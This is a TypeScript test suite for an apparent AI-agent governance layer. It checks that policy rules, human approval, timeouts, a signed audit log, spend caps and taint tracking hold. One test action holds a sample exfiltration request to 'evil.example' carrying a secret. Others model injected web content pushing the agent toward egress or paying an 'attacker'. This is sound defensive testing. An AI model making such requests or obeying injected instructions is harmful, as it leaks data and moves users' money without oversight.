import { test, describe, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { AuditLog, verifyAuditFile } from '../src/governance/audit';
import { Governor } from '../src/governance/governor';
import { Ed25519Signer } from '../src/governance/signer';
import { MnemoPaySpendAuthority, PaymentRail, SpendAuthority } from '../src/governance/spend';
import { TaintTracker } from '../src/governance/taint';
import { Action, Approver, GovernorDenied } from '../src/governance/types';
import { HangingApprover, ScriptedApprover, policyWith, rm, tmpDir } from './helpers';

class FakeRail implements PaymentRail {
  readonly name = 'fake';
  charges: Array<{ cents: number; payee: string; key: string }> = [];
  failNext = false;
  async charge(r: { cents: number; payee: string; memo: string; idempotencyKey: string }) {
    if (this.failNext) {
      this.failNext = false;
      throw new Error('rail down');
    }
    this.charges.push({ cents: r.cents, payee: r.payee, key: r.idempotencyKey });
    return { id: `tx${this.charges.length}` };
  }
}

/** CONTROL authority: approves anything. Used to show the cap tests depend on the real token check. */
class PermissiveAuthority implements SpendAuthority {
  total = 0;
  check() { return { ok: true }; }
  reserve(c: number) { this.total += c; }
  release(c: number) { this.total -= c; }
  get totalReservedCents() { return this.total; }
}

describe('Governor', () => {
  let dir: string;
  let signer: Ed25519Signer;
  let audit: AuditLog;
  beforeEach(() => {
    dir = tmpDir();
    signer = Ed25519Signer.generate();
    audit = new AuditLog(path.join(dir, 'audit.jsonl'), signer);
  });
  afterEach(() => rm(dir));

  const make = (policyOver: Record<string, unknown>, approver?: Approver, extra: { spend?: SpendAuthority; rail?: PaymentRail; taint?: TaintTracker } = {}) => {
    const policy = policyWith(policyOver);
    const taint = extra.taint ?? new TaintTracker();
    return { gov: new Governor({ policy, audit, taint, approver, spendAuthority: extra.spend, rail: extra.rail }), taint };
  };
  const execAction: Action = { class: 'exec', target: 'sandbox:js', summary: 'run code', detail: 'console.log(1)' };

  test('no approver (non-interactive): everything that needs approval is denied', async () => {
    const { gov } = make({});
    const d = await gov.authorize(execAction);
    assert.equal(d.allowed, false);
    assert.equal(d.by, 'no-approver');
  });

  test('default policy allows in-workspace reads with no approver, nothing else', async () => {
    const { gov } = make({});
    assert.equal((await gov.authorize({ class: 'fs.read', target: '/w/x', summary: '', inWorkspace: true })).allowed, true);
    assert.equal((await gov.authorize({ class: 'fs.read', target: '/etc/x', summary: '', inWorkspace: false })).allowed, false);
    assert.equal((await gov.authorize({ class: 'fs.write', target: '/w/x', summary: '', inWorkspace: true })).allowed, false);
    assert.equal((await gov.authorize({ class: 'net.egress', target: 'a.com', host: 'a.com', summary: '' })).allowed, false);
  });

  test('human approve / deny', async () => {
    const yes = new ScriptedApprover(() => 'approve');
    const { gov } = make({}, yes);
    const d = await gov.authorize(execAction);
    assert.equal(d.allowed, true);
    assert.equal(d.by, 'human');
    assert.equal(yes.seen[0].action.detail, 'console.log(1)', 'approver sees the exact payload');
    const no = make({}, new ScriptedApprover(() => 'deny'));
    assert.equal((await no.gov.authorize(execAction)).allowed, false);
  });

  test('anything other than the exact answer "approve" is a deny', async () => {
    const weird = new ScriptedApprover(() => 'yes' as any);
    assert.equal((await make({}, weird).gov.authorize(execAction)).allowed, false);
  });

  test('approval timeout is a deny, and the approver is aborted', async () => {
    const hang = new HangingApprover();
    const { gov } = make({ approvalTimeoutSeconds: 5 }, hang);
    const t0 = Date.now();
    const d = await gov.authorize(execAction);
    assert.equal(d.allowed, false);
    assert.equal(d.by, 'timeout');
    assert.ok(Date.now() - t0 >= 4900 && Date.now() - t0 < 8000);
    assert.equal(hang.aborted, true);
  });

  test('an approver that throws is a deny', async () => {
    const boom: Approver = { name: 'boom', request: async () => { throw new Error('kaput'); } };
    const d = await make({}, boom).gov.authorize(execAction);
    assert.equal(d.allowed, false);
    assert.equal(d.by, 'approver-error');
  });

  test('policy deny cannot be overridden by an approver that would say yes', async () => {
    const yes = new ScriptedApprover(() => 'approve');
    const { gov } = make({ rules: [{ class: 'exec', verdict: 'deny' }] }, yes);
    const d = await gov.authorize(execAction);
    assert.equal(d.allowed, false);
    assert.equal(yes.seen.length, 0, 'a denied action must not even be shown to a human');
  });

  test('decisions are written to the audit log BEFORE the action runs, results after, and the log verifies', async () => {
    const { gov } = make({}, new ScriptedApprover(() => 'approve'));
    const order: string[] = [];
    await gov.governed(execAction, async () => {
      order.push(`during:${audit.length}`);
      return 1;
    });
    const recs = fs.readFileSync(audit.path, 'utf8').trim().split('\n').map((l) => JSON.parse(l));
    const types = recs.map((r) => r.type);
    const reqIdx = types.indexOf('decision.request');
    const resIdx = types.indexOf('decision.result');
    const actIdx = types.indexOf('action.result');
    assert.ok(reqIdx > 0 && reqIdx < resIdx && resIdx < actIdx, types.join(','));
    assert.equal(order[0], `during:${resIdx + 1}`, 'the action ran after the decision records were written');
    assert.equal(verifyAuditFile(audit.path, { pinnedPublicKeyHex: signer.publicKeyHex }).ok, true);
  });

  test('a failing action is audited with ok:false', async () => {
    const { gov } = make({}, new ScriptedApprover(() => 'approve'));
    await assert.rejects(() => gov.governed(execAction, async () => { throw new Error('boom'); }), /boom/);
    const last = JSON.parse(fs.readFileSync(audit.path, 'utf8').trim().split('\n').pop()!);
    assert.equal(last.type, 'action.result');
    assert.equal(last.data.ok, false);
  });

  describe('taint', () => {
    const allowNet = { rules: [{ class: 'net.egress', verdict: 'allow' }, { class: 'exec', verdict: 'allow' }, { class: 'skill.save', verdict: 'allow' }, { class: 'fs.write', verdict: 'allow' }] };
    const egress: Action = { class: 'net.egress', target: 'evil.example', host: 'evil.example', summary: 'GET http://evil.example/?d=secret' };

    test('CONTROL: with a clean session, a policy allow rule auto-allows exec / egress / skill.save', async () => {
      const { gov } = make(allowNet, new ScriptedApprover(() => 'deny'));
      for (const a of [execAction, egress, { class: 'skill.save', target: 's', summary: '' } as Action]) {
        const d = await gov.authorize(a);
        assert.equal(d.allowed, true, a.class);
        assert.equal(d.by, 'policy');
      }
    });

    test('tainted session: exec / net.egress / skill.save are NEVER auto-allowed; they escalate to a human who sees the provenance', async () => {
      const approver = new ScriptedApprover(() => 'deny');
      const { gov, taint } = make(allowNet, approver);
      taint.mark('web', 'http://page.example/injected');
      for (const a of [execAction, egress, { class: 'skill.save', target: 's', summary: '' } as Action]) {
        const d = await gov.authorize(a);
        assert.equal(d.allowed, false, a.class);
        assert.equal(d.escalatedByTaint, true, a.class);
      }
      assert.equal(approver.seen.length, 3);
      assert.ok(approver.seen.every((r) => r.provenance.tainted && r.provenance.sources[0].ref === 'http://page.example/injected' && r.escalatedByTaint));
    });

    test('tainted session with no approver: denied (non-interactive)', async () => {
      const { gov, taint } = make(allowNet);
      taint.mark('non-owner-message', 'telegram:999');
      assert.equal((await gov.authorize(egress)).allowed, false);
    });

    test('taint does not block classes outside the sensitive set (fs.write by policy stays allowed; it is the policy author\'s call)', async () => {
      const { gov, taint } = make(allowNet);
      taint.mark('web', 'x');
      assert.equal((await gov.authorize({ class: 'fs.write', target: '/w/a', summary: '', inWorkspace: true })).allowed, true);
    });

    test('a human can still approve a tainted action (the point is that a human decides)', async () => {
      const { gov, taint } = make(allowNet, new ScriptedApprover(() => 'approve'));
      taint.mark('web', 'x');
      const d = await gov.authorize(egress);
      assert.equal(d.allowed, true);
      assert.equal(d.by, 'human');
    });

    test('taint is recorded in the audit log', async () => {
      const taint = new TaintTracker((s) => audit.append('taint.mark', { kind: s.kind, ref: s.ref }));
      taint.mark('web', 'http://x');
      const recs = fs.readFileSync(audit.path, 'utf8');
      assert.match(recs, /taint\.mark/);
    });
  });

  describe('spend', () => {
    const limits = { maxPerActionCents: 500, maxTotalCents: 800, tokenMinutes: 60 };
    const policy = (extra: Record<string, unknown> = {}) => ({ spend: limits, ...extra });
    const approve = () => new ScriptedApprover(() => 'approve');

    test('approved spend within caps charges the rail once with an idempotency key, and totals are tracked', async () => {
      const rail = new FakeRail();
      const auth = new MnemoPaySpendAuthority('a1', limits);
      const { gov } = make(policy(), approve(), { spend: auth, rail });
      const r = await gov.spend({ cents: 300, payee: 'vendor', memo: 'm' });
      assert.equal(r.cents, 300);
      assert.equal(rail.charges.length, 1);
      assert.ok(rail.charges[0].key.length > 10);
      assert.equal(auth.totalReservedCents, 300);
    });

    test('a human approving more than the per-action cap CANNOT exceed it', async () => {
      const rail = new FakeRail();
      const yes = approve();
      const { gov } = make(policy(), yes, { spend: new MnemoPaySpendAuthority('a2', limits), rail });
      await assert.rejects(() => gov.spend({ cents: 501, payee: 'v', memo: '' }), (e: any) => e instanceof GovernorDenied && e.decision.by === 'spend-authority');
      assert.equal(rail.charges.length, 0);
      assert.equal(yes.seen.length, 0, 'impossible spends are refused before bothering the human');
    });

    test('CONTROL: with a permissive authority the same approval DOES move the money (the cap is what stops it)', async () => {
      const rail = new FakeRail();
      const { gov } = make(policy(), approve(), { spend: new PermissiveAuthority(), rail });
      await gov.spend({ cents: 501, payee: 'v', memo: '' });
      assert.equal(rail.charges.length, 1);
    });

    test('the total cap holds across many approved spends', async () => {
      const rail = new FakeRail();
      const { gov } = make(policy(), approve(), { spend: new MnemoPaySpendAuthority('a3', limits), rail });
      await gov.spend({ cents: 400, payee: 'v', memo: '' });
      await gov.spend({ cents: 400, payee: 'v', memo: '' });
      await assert.rejects(() => gov.spend({ cents: 1, payee: 'v', memo: '' }), GovernorDenied);
      assert.equal(rail.charges.reduce((s, c) => s + c.cents, 0), 800);
    });

    test('concurrent spends cannot jointly exceed the total cap', async () => {
      const rail = new FakeRail();
      const { gov } = make(policy(), approve(), { spend: new MnemoPaySpendAuthority('a4', limits), rail });
      const results = await Promise.allSettled([1, 2, 3, 4].map(() => gov.spend({ cents: 300, payee: 'v', memo: '' })));
      assert.equal(results.filter((r) => r.status === 'fulfilled').length, 2); // 600 <= 800 < 900
      assert.equal(rail.charges.reduce((s, c) => s + c.cents, 0), 600);
    });

    test('default policy: spending is impossible (0 cap) even if a human says yes', async () => {
      const rail = new FakeRail();
      const { gov } = make({}, approve(), { spend: new MnemoPaySpendAuthority('a5', { maxPerActionCents: 0, maxTotalCents: 0, tokenMinutes: 60 }), rail });
      await assert.rejects(() => gov.spend({ cents: 1, payee: 'v', memo: '' }), GovernorDenied);
      assert.equal(rail.charges.length, 0);
    });

    test('no spend authority configured: denied', async () => {
      const { gov } = make(policy(), approve(), { rail: new FakeRail() });
      await assert.rejects(() => gov.spend({ cents: 1, payee: 'v', memo: '' }), GovernorDenied);
    });

    test('integer cents only: floats, negatives, zero, NaN, Infinity and huge numbers are refused', async () => {
      const rail = new FakeRail();
      const { gov } = make(policy(), approve(), { spend: new PermissiveAuthority(), rail });
      for (const bad of [1.5, -1, 0, NaN, Infinity, Number.MAX_SAFE_INTEGER + 2, '5' as any]) {
        await assert.rejects(() => gov.spend({ cents: bad, payee: 'v', memo: '' }), GovernorDenied, String(bad));
      }
      assert.equal(rail.charges.length, 0);
    });

    test('a failed rail charge releases the reservation', async () => {
      const rail = new FakeRail();
      const auth = new MnemoPaySpendAuthority('a6', limits);
      const { gov } = make(policy(), approve(), { spend: auth, rail });
      rail.failNext = true;
      await assert.rejects(() => gov.spend({ cents: 500, payee: 'v', memo: '' }), /rail down/);
      assert.equal(auth.totalReservedCents, 0);
      await gov.spend({ cents: 500, payee: 'v', memo: '' }); // budget is intact
      assert.equal(rail.charges.length, 1);
    });

    test('a tainted spend is escalated even if policy allows it, and denial means no money moves', async () => {
      const rail = new FakeRail();
      const deny = new ScriptedApprover(() => 'deny');
      const { gov, taint } = make(policy({ rules: [{ class: 'spend', verdict: 'allow' }] }), deny, { spend: new MnemoPaySpendAuthority('a7', limits), rail });
      taint.mark('web', 'http://page/inject');
      await assert.rejects(() => gov.spend({ cents: 100, payee: 'attacker', memo: 'pay now' }), GovernorDenied);
      assert.equal(rail.charges.length, 0);
      assert.equal(deny.seen[0].escalatedByTaint, true);
      assert.equal(deny.seen[0].action.cents, 100);
    });

    test('CONTROL: the same spend with a clean session and an allow rule goes straight through', async () => {
      const rail = new FakeRail();
      const { gov } = make(policy({ rules: [{ class: 'spend', verdict: 'allow' }] }), new ScriptedApprover(() => 'deny'), { spend: new MnemoPaySpendAuthority('a8', limits), rail });
      await gov.spend({ cents: 100, payee: 'ok', memo: '' });
      assert.equal(rail.charges.length, 1);
    });

    test('the total cap survives a process restart (persisted ledger); a corrupt ledger fails closed; a new day resets', async () => {
      const ledger = path.join(dir, 'spend.json');
      const mkAuth = (today = '2030-01-01') => new MnemoPaySpendAuthority(`r${Math.random()}`, limits, { ledgerFile: ledger, today: () => today });
      const rail = new FakeRail();
      const a1 = mkAuth();
      await make(policy(), approve(), { spend: a1, rail }).gov.spend({ cents: 500, payee: 'v', memo: '' });
      // "restart": brand-new authority and registry, same ledger file
      const a2 = mkAuth();
      assert.equal(a2.totalReservedCents, 500);
      const { gov } = make(policy(), approve(), { spend: a2, rail });
      await assert.rejects(() => gov.spend({ cents: 400, payee: 'v', memo: '' }), GovernorDenied); // 500 + 400 > 800
      await gov.spend({ cents: 300, payee: 'v', memo: '' });
      assert.equal(rail.charges.reduce((s, c) => s + c.cents, 0), 800);
      // corrupt ledger => treated as fully spent
      fs.writeFileSync(ledger, '{not json');
      assert.equal(mkAuth().check(1, 'v').ok, false);
      // next UTC day => fresh allowance
      fs.writeFileSync(ledger, JSON.stringify({ day: '2030-01-01', cents: 800 }));
      assert.equal(mkAuth('2030-01-02').check(1, 'v').ok, true);
    });

    test('an expired token refuses spends', async () => {
      const auth = new MnemoPaySpendAuthority('a9', limits);
      (auth as any).registry.tokens.get((auth as any).tokenId).expiresAt = new Date(Date.now() - 1000).toISOString();
      const { gov } = make(policy(), approve(), { spend: auth, rail: new FakeRail() });
      await assert.rejects(() => gov.spend({ cents: 1, payee: 'v', memo: '' }), GovernorDenied);
    });
  });
});
